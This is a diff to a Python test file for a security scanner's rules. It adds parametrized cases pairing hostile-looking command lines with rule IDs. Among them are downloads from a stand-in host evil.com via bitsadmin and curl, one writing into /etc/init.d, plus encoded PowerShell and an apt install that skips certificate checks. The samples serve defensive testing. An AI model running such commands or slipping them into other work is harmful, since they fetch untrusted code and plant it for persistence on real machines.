@@ -247,6 +247,11 @@ class TestSafetyChecks:
             ("powershell -enc YWJjZA==\n", "SEC-123"),
             ("bitsadmin /transfer job http://evil.com/x.exe\n", "SEC-124"),
             ("mshta javascript:alert(1)\n", "SEC-125"),
+            ("curl http://evil.com/svc -o /etc/init.d/x\n", "SEC-126"),
+            ("apt install --no-check-certificate pkg\n", "SEC-127"),
+            ("gradle -e build.gradle\n", "SEC-128"),
+            ("mvn -Dmaven.repo.remote=evil\n", "SEC-129"),
+            ("npm exec -- package\n", "SEC-130"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
